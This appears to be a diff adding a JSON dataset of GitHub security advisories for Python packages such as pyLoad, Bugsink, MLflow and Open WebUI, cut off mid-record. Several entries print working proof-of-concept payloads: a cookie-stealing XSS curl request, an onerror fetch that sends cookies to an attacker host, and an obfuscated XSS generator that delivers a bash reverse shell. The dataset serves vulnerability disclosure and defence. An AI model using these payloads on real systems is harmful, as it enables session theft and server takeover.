@@ -1,0 +1,467 @@
+[
+  {
+    "ghsa_id": "GHSA-4m32-cjv7-f425",
+    "cve_id": "CVE-2025-55449",
+    "summary": "AstrBot is vulnerable to RCE with hard-coded JWT signing keys",
+    "description": "### Summary\nAstrBot uses a hard-coded JWT signing key, allowing attackers to execute arbitrary commands by installing a malicious plugin.\n\n### Details\n\nAstrBot uses a [hard-coded JWT signing key](https://github.com/AstrBotDevs/AstrBot/blob/v3.5.16/astrbot/core/__init__.py), which allows attackers to bypass the authentication mechanism. Once bypassed, the attacker can install a Python plugin that will be imported [here](https://github.com/AstrBotDevs/AstrBot/blob/master/astrbot/dashboard/routes/plugin.py), enabling arbitrary command execution on the target host.\n\n### Impact\n\nAll publicly accessible AstrBot instances are vulnerable.\n\nFor more information, please see: [CVE-2025-55449-AstrBot-RCE](https://github.com/Marven11/CVE-2025-55449-AstrBot-RCE)\n\n### Patch\n\nThis vulnerability was first reported on **2025-06-21** and was patched on the **same day** (2025-06-21).\n\nThe vulnerability was publicly disclosed on **2025-11-14**. Prior to public disclosure, monitoring from AstrBot Cloud indicated that fewer than 2% of deployed instances were still running the affected version. Therefore, this disclosure is not expected to have a significant impact on existing active instances.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-345",
+      "CWE-798"
+    ],
+    "published_at": "2025-11-14T21:52:23Z",
+    "references": [
+      "https://github.com/AstrBotDevs/AstrBot/security/advisories/GHSA-4m32-cjv7-f425",
+      "https://github.com/AstrBotDevs/AstrBot/commit/d03e9fb90a0921a1bd10cf480bdacc9aaa246472",
+      "https://github.com/AstrBotDevs/AstrBot/releases/tag/v3.5.18",
+      "https://github.com/Marven11/CVE-2025-55449-AstrBot-RCE",
+      "https://github.com/advisories/GHSA-4m32-cjv7-f425"
+    ],
+    "patch_urls": [
+      "https://github.com/AstrBotDevs/AstrBot/commit/d03e9fb90a0921a1bd10cf480bdacc9aaa246472"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "astrbot",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 3.5.18"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-8w3f-4r8f-pf53",
+    "cve_id": "CVE-2025-53890",
+    "summary": "pyLoad vulnerable to XSS through insecure CAPTCHA ",
+    "description": "#### Summary\nAn unsafe JavaScript evaluation vulnerability in pyLoad’s CAPTCHA processing code allows **unauthenticated remote attackers** to execute **arbitrary code** in the client browser and potentially the backend server. Exploitation requires no user interaction or authentication and can result in session hijacking, credential theft, and full system rce.\n\n\n\n#### Details\nThe vulnerable code resides in \n```javascript\nfunction onCaptchaResult(result) {\n    eval(result); // Direct execution of attacker-controlled input\n}\n```\n\n* The `onCaptchaResult()` function directly passes CAPTCHA results (sent from the user) into `eval()`\n* No sanitization or validation is performed on this input\n* A malicious CAPTCHA result can include JavaScript such as `fetch()` or `child_process.exec()` in environments using NodeJS\n* Attackers can fully hijack sessions and pivot to remote code execution on the server if the environment allows it\n\n\n\n### Reproduction Methods\n1. **Official Source Installation**:\n```bash\ngit clone https://github.com/pyload/pyload\ncd pyload\ngit checkout 0.4.20\npython -m pip install -e .\npyload --userdir=/tmp/pyload\n```\n\n2. **Virtual Environment**:\n```bash\npython -m venv pyload-env\nsource pyload-env/bin/activate\npip install pyload==0.4.20\npyload\n```\n\n## CAPTCHA Endpoint Verification\n\n\n**Technical Clarification**:  \n1. The vulnerable endpoint is actually:\n   ```\n   /interactive/captcha\n   ```\n\n2. Complete PoC Request:\n```http\nPOST /interactive/captcha HTTP/1.1\nHost: localhost:8000\nContent-Type: application/x-www-form-urlencoded\n\ncid=123&response=1%3Balert(document.cookie)\n```\n\n3. Curl Command Correction:\n```bash\ncurl -X POST \"http://localhost:8000/interactive/captcha\" \\\n  -d \"cid=123&response=1%3Balert(document.cookie)\"\n```\n\n\n1. **Vulnerable Code Location**:  \n   The eval() vulnerability is confirmed in:\n   ```\n   src/pyload/webui/app/static/js/captcha-interactive.user.js\n   ```\n\n\n\n### **Resources**\n\n1. https://github.com/pyload/pyload/commit/909e5c97885237530d1264cfceb5555870eb9546\n2. [OWASP: Avoid `eval()`](https://cheatsheetseries.owasp.org/cheatsheets/JavaScript_Security_Cheat_Sheet.html#eval)\n3. [#4586](https://github.com/pyload/pyload/pull/4586)",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-79",
+      "CWE-94"
+    ],
+    "published_at": "2025-07-15T15:38:10Z",
+    "references": [
+      "https://github.com/pyload/pyload/security/advisories/GHSA-8w3f-4r8f-pf53",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-53890",
+      "https://github.com/pyload/pyload/pull/4586",
+      "https://github.com/pyload/pyload/commit/909e5c97885237530d1264cfceb5555870eb9546",
+      "https://github.com/advisories/GHSA-8w3f-4r8f-pf53"
+    ],
+    "patch_urls": [
+      "https://github.com/pyload/pyload/pull/4586",
+      "https://github.com/pyload/pyload/commit/909e5c97885237530d1264cfceb5555870eb9546"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "pyload-ng",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 0.20"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-v9q6-fm48-rx74",
+    "cve_id": "CVE-2024-3408",
+    "summary": "Authentication bypass in dtale",
+    "description": "man-group/dtale version 3.10.0 is vulnerable to an authentication bypass and remote code execution (RCE) due to improper input validation. The vulnerability arises from a hardcoded `SECRET_KEY` in the flask configuration, allowing attackers to forge a session cookie if authentication is enabled. Additionally, the application fails to properly restrict custom filter queries, enabling attackers to execute arbitrary code on the server by bypassing the restriction on the `/update-settings` endpoint, even when `enable_custom_filters` is not enabled. This vulnerability allows attackers to bypass authentication mechanisms and execute remote code on the server.",
+    "severity": "high",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-20",
+      "CWE-798"
+    ],
+    "published_at": "2024-06-06T21:30:37Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-3408",
+      "https://huntr.com/bounties/57a06666-ff85-4577-af19-f3dfb7b02f91",
+      "https://github.com/man-group/dtale/commit/32bd6fb4a63de779ff1e51823a456865ea3cbd13",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/dtale/PYSEC-2024-117.yaml",
+      "https://github.com/advisories/GHSA-v9q6-fm48-rx74"
+    ],
+    "patch_urls": [
+      "https://github.com/man-group/dtale/commit/32bd6fb4a63de779ff1e51823a456865ea3cbd13"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "dtale",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 3.10.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-pqgm-9g82-wcm7",
+    "cve_id": "CVE-2023-5688",
+    "summary": "modoboa Cross-site Scripting vulnerability",
+    "description": "Cross-site Scripting (XSS) - DOM in GitHub repository modoboa/modoboa prior to 2.2.2.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-79"
+    ],
+    "published_at": "2023-10-20T18:30:57Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-5688",
+      "https://github.com/modoboa/modoboa/commit/d33d3cd2d11dbfebd8162c46e2c2a9873919a967",
+      "https://huntr.com/bounties/0ceb10e4-952b-4ca4-baf8-5b6f12e3a8a7",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/modoboa/PYSEC-2023-215.yaml",
+      "https://github.com/advisories/GHSA-pqgm-9g82-wcm7"
+    ],
+    "patch_urls": [
+      "https://github.com/modoboa/modoboa/commit/d33d3cd2d11dbfebd8162c46e2c2a9873919a967"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "modoboa",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.2.2"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-fvcq-4x64-hqxr",
+    "cve_id": "CVE-2024-35225",
+    "summary": "Jupyter Server Proxy has a reflected XSS issue in host parameter",
+    "description": "### Impact\n\nThere is a reflected cross-site scripting (XSS) issue in `jupyter-server-proxy`[1]. The `/proxy` endpoint accepts a `host` path segment in the format `/proxy/<host>`. When this endpoint is called with an invalid `host` value, `jupyter-server-proxy` replies with a response that includes the value of `host`, without sanitization [2]. A third-party actor can leverage this by sending a phishing link with an invalid `host` value containing custom JavaScript to a user. When the user clicks this phishing link, the browser renders the response of `GET /proxy/<host>`, which runs the custom JavaScript contained in `host` set by the actor.\nAs any arbitrary JavaScript can be run after the user clicks on a phishing link, this issue permits extensive access to the user's JupyterLab instance for an actor. This issue exists in the latest release of `jupyter-server-proxy`, currently `v4.1.2`.\n**Impacted versions:** `>=3.0.0,<=4.1.2`\n\n### Patches\n\nThe patches are included in `==4.2.0` and `==3.2.4`.\n\n### Workarounds\n\nServer operators who are unable to upgrade can disable the `jupyter-server-proxy` extension with:\n\n```\njupyter server extension disable jupyter-server-proxy\n```\n\n### References\n\n[1] : https://github.com/jupyterhub/jupyter-server-proxy/\n[2] : https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328",
+    "severity": "critical",
+    "cvss_score": 9.7,
+    "cwes": [
+      "CWE-79",
+      "CWE-116"
+    ],
+    "published_at": "2024-06-11T21:12:47Z",
+    "references": [
+      "https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr",
+      "https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22",
+      "https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878",
+      "https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-35225",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/jupyter-server-proxy/PYSEC-2024-236.yaml",
+      "https://github.com/advisories/GHSA-fvcq-4x64-hqxr"
+    ],
+    "patch_urls": [
+      "https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22",
+      "https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "jupyter-server-proxy",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 3.0.0, < 3.2.4"
+      },
+      {
+        "package": "jupyter-server-proxy",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 4.0.0, < 4.2.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-3v79-q7ph-j75h",
+    "cve_id": "CVE-2024-27133",
+    "summary": "MLFlow Cross-site Scripting vulnerability leads to client-side Remote Code Execution",
+    "description": "Insufficient sanitization in MLflow leads to XSS when running a recipe that uses an untrusted dataset. This issue leads to a client-side RCE when running the recipe in Jupyter Notebook. The vulnerability stems from lack of sanitization over dataset table fields.",
+    "severity": "critical",
+    "cvss_score": 9.7,
+    "cwes": [
+      "CWE-79"
+    ],
+    "published_at": "2024-02-24T00:30:20Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-27133",
+      "https://github.com/mlflow/mlflow/pull/10893",
+      "https://research.jfrog.com/vulnerabilities/mlflow-untrusted-dataset-xss-jfsa-2024-000631932",
+      "https://github.com/mlflow/mlflow/commit/c43823750bffa5b6abcc086683b15a068513b67b",
+      "https://github.com/mlflow/mlflow/commit/cfa71879a884cc3520e23ccab998c9aa78fdf2b1",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2024-241.yaml",
+      "https://github.com/advisories/GHSA-3v79-q7ph-j75h"
+    ],
+    "patch_urls": [
+      "https://github.com/mlflow/mlflow/pull/10893",
+      "https://github.com/mlflow/mlflow/commit/c43823750bffa5b6abcc086683b15a068513b67b",
+      "https://github.com/mlflow/mlflow/commit/cfa71879a884cc3520e23ccab998c9aa78fdf2b1"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "mlflow",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.10.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-6749-m5cp-6cg7",
+    "cve_id": "CVE-2024-27132",
+    "summary": "Cross-site Scripting in MLFlow",
+    "description": "Insufficient sanitization in MLflow leads to XSS when running an untrusted recipe.\n\nThis issue leads to a client-side RCE when running an untrusted recipe in Jupyter Notebook.\n\nThe vulnerability stems from lack of sanitization over template variables.",
+    "severity": "critical",
+    "cvss_score": 9.7,
+    "cwes": [
+      "CWE-79"
+    ],
+    "published_at": "2024-02-24T00:30:20Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-27132",
+      "https://github.com/mlflow/mlflow/pull/10873",
+      "https://research.jfrog.com/vulnerabilities/mlflow-untrusted-recipe-xss-jfsa-2024-000631930",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2024-240.yaml",
+      "https://github.com/advisories/GHSA-6749-m5cp-6cg7"
+    ],
+    "patch_urls": [
+      "https://github.com/mlflow/mlflow/pull/10873"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "mlflow",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.10.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-rwhh-6x83-84v6",
+    "cve_id": "CVE-2023-49657",
+    "summary": "Cross-site Scripting in Apache superset",
+    "description": "A stored cross-site scripting (XSS) vulnerability exists in Apache Superset before 3.0.3. An authenticated attacker with create/update permissions on charts or dashboards could store a script or add a specific HTML snippet that would act as a stored XSS.\n\nFor 2.X versions, users should change their config to include:\n\nTALISMAN_CONFIG = {\n    \"content_security_policy\": {\n        \"base-uri\": [\"'self'\"],\n        \"default-src\": [\"'self'\"],\n        \"img-src\": [\"'self'\", \"blob:\", \"data:\"],\n        \"worker-src\": [\"'self'\", \"blob:\"],\n        \"connect-src\": [\n            \"'self'\",\n            \" https://api.mapbox.com\" https://api.mapbox.com\" ;,\n            \" https://events.mapbox.com\" https://events.mapbox.com\" ;,\n        ],\n        \"object-src\": \"'none'\",\n        \"style-src\": [\n            \"'self'\",\n            \"'unsafe-inline'\",\n        ],\n        \"script-src\": [\"'self'\", \"'strict-dynamic'\"],\n    },\n    \"content_security_policy_nonce_in\": [\"script-src\"],\n    \"force_https\": False,\n    \"session_cookie_secure\": False,\n}",
+    "severity": "critical",
+    "cvss_score": 9.6,
+    "cwes": [
+      "CWE-79"
+    ],
+    "published_at": "2024-01-23T15:30:58Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-49657",
+      "https://lists.apache.org/thread/wjyvz8om9nwd396lh0bt156mtwjxpsvx",
+      "http://www.openwall.com/lists/oss-security/2024/01/23/5",
+      "https://github.com/advisories/GHSA-rwhh-6x83-84v6"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "apache-superset",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 3.0.3"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-vp6q-7m36-pq3w",
+    "cve_id": "CVE-2026-27614",
+    "summary": "Bugsink is vulnerable to Stored XSS via Pygments fallback in stacktrace rendering",
+    "description": "### Summary\n\nAn unauthenticated attacker who can submit events to a Bugsink project can store arbitrary JavaScript in an event.\nThe payload executes only if a user explicitly views the affected Stacktrace in the web UI.\n\n### Details\n\nWhen Pygments returns more lines than it was given (a known upstream quirk that triggers with Ruby heredoc-style input), `_pygmentize_lines()` in `theme/templatetags/issues.py:75-77` falls back to returning the raw input lines. `mark_safe()` at line 111-113 is then applied unconditionally - including to those unsanitized raw lines. Since DSN endpoints are public by Sentry protocol, no account is needed to inject. The payload sits in the database until an admin looks at the event.\n\n```python\n# issues.py:75-77 - fallback path, no escaping\nif len(pygmented) != len(lines):\n    return lines  # raw HTML returned here\n\n# issues.py:111-113 - unconditional mark_safe\nreturn [mark_safe(line) for line in result]\n```\n\n### Operational Signals\n\nExploitation attempts are likely to generate the diagnostic event:\n\n```\n\"Pygments line count mismatch, falling back to unformatted code\"\n```\n\nInstallations that monitor Bugsink with Bugsink (or otherwise alert on internal errors)\nmay see this message as an issue. While the condition can occur benignly, unexpected\noccurrences, especially from unusual languages (specifically ruby), warrant review.\n\n\n### PoC\n\nSend a Sentry event to `/api/<project-id>/store/` with a valid DSN:\n\n```python\nimport requests\n\npayload = {\n    \"exception\": {\"values\": [{\"stacktrace\": {\"frames\": [{\n        \"filename\": \"app.rb\",\n        \"lineno\": 2,\n        \"pre_context\": [\"<<~HEREDOC\", \"  foo\", \"HEREDOC\"],\n        \"context_line\": \"<img src=x onerror=fetch('//attacker/?c='+document.cookie)>\",\n        \"post_context\": []\n    }]}}]}\n}\n\nrequests.post(\n    \"http://bugsink-host/api/<project-id>/store/\",\n    json=payload,\n    headers={\"X-Sentry-Auth\": \"Sentry sentry_key=<dsn-public-key>, sentry_version=7\"}\n)\n```\n\nOpen the event in the bugsink UI as any admin. Cookie exfiltrates immediately.\n\n### Impact\n\nThis is a stored XSS vulnerability.\n\nSuccessful exploitation requires:\n\n* The attacker can submit events to the project (i.e. knows the DSN or can access a client that uses it).\n* The Bugsink ingest endpoint is reachable to the attacker.\n* An administrator explicitly views the crafted event in the UI.\n\nUnder those conditions, the attacker can execute JavaScript in the administrator’s browser\nand act with that user’s privileges within Bugsink.",
+    "severity": "critical",
+    "cvss_score": 9.3,
+    "cwes": [
+      "CWE-79"
+    ],
+    "published_at": "2026-02-25T16:06:00Z",
+    "references": [
+      "https://github.com/bugsink/bugsink/security/advisories/GHSA-vp6q-7m36-pq3w",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-27614",
+      "https://github.com/bugsink/bugsink/commit/e784d6aeb0d5f29b40c2779d2544c2b9ef097ee9",
+      "https://github.com/bugsink/bugsink/releases/tag/2.0.13",
+      "https://github.com/advisories/GHSA-vp6q-7m36-pq3w"
+    ],
+    "patch_urls": [
+      "https://github.com/bugsink/bugsink/commit/e784d6aeb0d5f29b40c2779d2544c2b9ef097ee9"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "bugsink",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 2.0.12"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-2rrx-pphc-qfv9",
+    "cve_id": "CVE-2025-2946",
+    "summary": "pgAdmin 4 Vulnerable to Cross-Site Scripting (XSS) via Query Result Rendering",
+    "description": "pgAdmin <= 9.1 is affected by a security vulnerability with Cross-Site Scripting(XSS). If attackers execute any arbitrary HTML/JavaScript in a user's browser through query result rendering, then HTML/JavaScript runs on the browser.",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cwes": [
+      "CWE-79"
+    ],
+    "published_at": "2025-04-03T15:31:13Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-2946",
+      "https://github.com/pgadmin-org/pgadmin4/issues/8602",
+      "https://github.com/pgadmin-org/pgadmin4/commit/1305d9910beefd0d6b4c7eb4f111f86edb1d356b",
+      "https://github.com/advisories/GHSA-2rrx-pphc-qfv9"
+    ],
+    "patch_urls": [
+      "https://github.com/pgadmin-org/pgadmin4/commit/1305d9910beefd0d6b4c7eb4f111f86edb1d356b"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "pgadmin4",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 9.2"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-w7xj-8fx7-wfch",
+    "cve_id": "CVE-2025-64495",
+    "summary": "Open WebUI vulnerable to Stored DOM XSS via prompts when 'Insert Prompt as Rich Text' is enabled resulting in ATO/RCE",
+    "description": "### Summary\n\nThe functionality that inserts custom prompts into the chat window is vulnerable to DOM XSS when 'Insert Prompt as Rich Text' is enabled, since the prompt body is assigned to the DOM sink `.innerHtml` without sanitisation. Any user with permissions to create prompts can abuse this to plant a payload that could be triggered by other users if they run the corresponding `/` command to insert the prompt.\n\n### Details\n\nThe affected line is https://github.com/open-webui/open-webui/blob/7a83e7dfa367d19f762ec17cac5e4a94ea2bd97d/src/lib/components/common/RichTextInput.svelte#L348\n\n```js\n\texport const replaceCommandWithText = async (text) => {\n\t\tconst { state, dispatch } = editor.view;\n\t\tconst { selection } = state;\n\t\tconst pos = selection.from;\n\n\t\t// Get the plain text of this document\n\t\t// const docText = state.doc.textBetween(0, state.doc.content.size, '\\n', '\\n');\n\n\t\t// Find the word boundaries at cursor\n\t\tconst { start, end } = getWordBoundsAtPos(state.doc, pos);\n\n\t\tlet tr = state.tr;\n\n\t\tif (insertPromptAsRichText) {\n\t\t\tconst htmlContent = marked\n\t\t\t\t.parse(text, {\n\t\t\t\t\tbreaks: true,\n\t\t\t\t\tgfm: true\n\t\t\t\t})\n\t\t\t\t.trim();\n\n\t\t\t// Create a temporary div to parse HTML\n\t\t\tconst tempDiv = document.createElement('div');\n\t\t\ttempDiv.innerHTML = htmlContent;                                          // <---- vulnerable\n```\n\nUser controlled HTML from the prompt body is assigned to `tempDiv.innerHTML` without (meaningful) sanitisation. `marked.parse` introduces some character limitations but does not sanitise the content, as stated in their README.\n\n<img width=\"1816\" height=\"498\" alt=\"image\" src=\"https://github.com/user-attachments/assets/bd0980fc-ad87-460a-94b8-02bc94bea1a2\" />\n\n### PoC\nCreate a custom prompt as follows:\n<img width=\"3006\" height=\"1100\" alt=\"image\" src=\"https://github.com/user-attachments/assets/47de7a11-514d-48f9-8c6a-04ab1894f981\" />\n\nVia settings, ensure 'Insert Prompt as Rich Text' is enabled:\n<img width=\"2204\" height=\"1268\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f188065f-7c11-4f09-9ced-4e7d2e6f4d48\" />\n\nRun the command `/poc` via a chat window.\n<img width=\"2470\" height=\"1332\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5a112f51-210a-43f3-b999-915b1d0e6744\" />\n\nObserve the alert is triggered.\n<img width=\"2452\" height=\"1456\" alt=\"image\" src=\"https://github.com/user-attachments/assets/fa15dbd6-44a7-4cfc-bd93-4cc56aac5eea\" />\n\n#### RCE\nSince admins can naturally run arbitrary Python code on the server via the 'Functions' feature, this XSS could be used to force any admin that triggers it to run one such of these function with Python code of the attackers choosing. \n\nThis can be accomplished by making them run the following fetch request:\n```js\nfetch(\"https://<HOST>/api/v1/functions/create\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\n    \"Content-Type\": \"application/json\",\n    \"Accept\": \"application/json\"\n  },\n  body: JSON.stringify({\n    id: \"pentest_cmd_test\",\n    name: \"pentest cmd test\",\n    meta: { description: \"pentest cmd test\" },\n    content: \"import os;os.system('echo RCE')\"\n  })\n})\n```\nThis cannot be done directly because the `marked.parse` call the HTML is passed through will neutralise payloads containing quotes\n<img width=\"1718\" height=\"482\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6797efbd-4f2e-4570-ad9f-59a65dba1745\" />\nTo get around this strings must be manually constructed from their decimal values using `String.fromCodePoint`. The following Python script automates generating a viable payload from given JavaScript:\n```py\npayload2 = \"\"\"\nfetch(\"https://<HOST>/api/v1/functions/create\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\n    \"Content-Type\": \"application/json\",\n    \"Accept\": \"application/json\"\n  },\n  body: JSON.stringify({\n    id: \"pentest_cmd_test\",\n    name: \"pentest cmd test\",\n    meta: { description: \"pentest cmd test\" },\n    content: \"import os;os.system('bash -c \\\\\\\\'/bin/bash -i >& /dev/tcp/x.x.x.x/443 0>&1\\\\\\\\'')\"\n  })\n})\n\"\"\".lstrip().rstrip()\n\nout = \"\"\n\nfor c in payload2:\n    out += f\"String.fromCodePoint({ord(c)})+\"\n\nprint(f\"<img src=x onerror=eval({out[:-1]})>\")\n```\nAn admin that triggers the corresponding payload via a prompt command will trigger a Python function to run that runs a reverse shell payload, giving command line access on the server to the attacker.\n<img width=\"2476\" height=\"756\" alt=\"image\" src=\"https://github.com/user-attachments/assets/01f9e991-832a-4cfb-8c3e-3b2ce02cff15\" />\n\n<img width=\"2492\" height=\"1530\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d08eb48f-a688-41a1-9b52-e91df7ced929\" />\n<img width=\"1968\" height=\"916\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2ad6a19e-f151-4ac9-9903-0961e33fe42f\" />\n\n\n### Impact\n\nAny user running the malicious prompt could have their account compromised via malicious JavaScript that reads their session token from localstorage and exfiltrates it to an attacker controlled server.\n\nAdmin users running the malicious prompt risk exposing the backend server to remote code execution (RCE) since malicious JavaScript running via the vulnerability can be used to send requests as the admin user that run malicious Python functions, that may run operating system commands.\n\n### Caveats\n\nLow privilege users cannot create prompts by default, the USER_PERMISSIONS_WORKSPACE_PROMPTS_ACCESS permission is needed, which may be given out via e.g. a custom group. see: https://docs.openwebui.com/features/workspace/prompts/#access-control-and-permissions\n\nA victim user running the command to trigger the prompt needs to have the 'Insert Prompt as Rich Text' setting enabled via preferences for the vulnerability to trigger. The setting is off by default. Users with this setting disabled are unaffected.\n\n### Remediation\n\nSanitise the user controlled HTML with DOMPurify before assigning it to `.innerHtml`",
+    "severity": "high",
+    "cvss_score": 8.7,
+    "cwes": [
+      "CWE-79"
+    ],
+    "published_at": "2025-11-07T15:25:23Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-w7xj-8fx7-wfch",
+      "https://github.com/open-webui/open-webui/commit/eb9c4c0e358c274aea35f21c2856c0a20051e5f1",
+      "https://github.com/open-webui/open-webui/blob/7a83e7dfa367d19f762ec17cac5e4a94ea2bd97d/src/lib/components/common/RichTextInput.svelte#L348",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-64495",
+      "https://github.com/advisories/GHSA-w7xj-8fx7-wfch"
+    ],
+    "patch_urls": [
+      "https://github.com/open-webui/open-webui/commit/eb9c4c0e358c274aea35f21c2856c0a20051e5f1"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "open-webui",
+        "ecosystem": "npm",
+        "vulnerable_range": "<= 0.6.34"
+      },
+      {
+        "package": "open-webui",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 0.6.34"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-gj27-76gq-5v3p",
+    "cve_id": "CVE-2024-7990",
+    "summary": "Open WebUI stored cross-site scripting (XSS) vulnerability",
+    "description": "A stored cross-site scripting (XSS) vulnerability exists in open-webui/open-webui version 0.3.8. The vulnerability is present in the `/api/v1/models/add` endpoint, where the model description field is improperly sanitized before being rendered in chat. This allows an attacker to inject malicious scripts that can be executed by any user, including administrators, potentially leading to arbitrary code execution.",
+    "severity": "high",
+    "cvss_score": 8.4,
+    "cwes": [
+      "CWE-79"
+    ],
+    "published_at": "2025-03-20T12:32:47Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-7990",
+      "https://huntr.com/bounties/2256e336-0f67-449e-a82d-7fc57081a21c",
+      "https://github.com/advisories/GHSA-gj27-76gq-5v3p"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "open-webui",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 0.3.8"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-927p-xrc2-x2gj",
+    "cve_id": "CVE-2024-36110",
+    "summary": "ansibleguy-webui Cross-site Scripting vulnerability",
+    "description": "### Impact\nMultiple forms in version <0.0.21 allowed injection of HTML elements.\nThese are returned to the user after executing job actions and thus evaluated by the browser.\n\n### Patches\nWe recommend to upgrade to version >= [0.0.21](https://github.com/ansibleguy/webui/releases/tag/0.0.21)\n\n### References\n\n* [Report](https://github.com/ansibleguy/webui/files/15358522/Report.pdf)\n* [GitHub Issue 44](https://github.com/ansibleguy/webui/issues/44)\n",
+    "severity": "high",
+    "cvss_score": 8.2,
+    "cwes": [
+      "CWE-79"
+    ],
+    "published_at": "2024-05-28T21:23:42Z",
+    "references": [
+      "https://github.com/ansibleguy/webui/security/advisories/GHSA-927p-xrc2-x2gj",
+      "https://github.com/ansibleguy/webui/commit/7737b47e7f7ddbfec7b1418c724598363718d522",
+      "https://github.com/ansibleguy/webui/files/15358522/Report.pdf",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-36110",
+      "https://github.com/ansibleguy/webui/issues/44",
+      "https://github.com/advisories/GHSA-927p-xrc2-x2gj"
+    ],
+    "patch_urls": [
+      "https://github.com/ansibleguy/webui/commit/7737b47e7f7ddbfec7b1418c724598363718d522"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "ansibleguy-webui",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 0.0.21"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-578p-fxmm-6229",
+    "cve_id": "CVE-2024-26151",
+    "summary": "Potentially untrusted input is rendered as HTML in final output",
+    "description": "### Impact\n\nAll users of mjml-python who insert untrusted data into mjml templates unless that data is checked in a very strict manner. User input like `&lt;script&gt;` would be rendered as `<script>` in the final HTML output.\n\nThe attacker must be able to control some data which is later injected in an mjml template which is then send out as email to other users. The attacker could control contents of email messages sent through the platform.\n\n### Patches\n\nThe problem has been fixed in version 0.11.0 of this library. Versions before 0.10.0 are not affected by this security issue which was added as part of commit 84c495da20a91640a1ca551ace17df7f3be644aa.\n\n\n### Workarounds\n\n- Ensure that potentially untrusted user input does not contain any sequences which could be rendered as HTML. \n\n\n### References\n\n- Initial issue report by @sh-at-cs in #52\n",
+    "severity": "high",
+    "cvss_score": 8.2,
+    "cwes": [
+      "CWE-20",
+      "CWE-79"
+    ],
+    "published_at": "2024-02-22T21:40:59Z",
+    "references": [
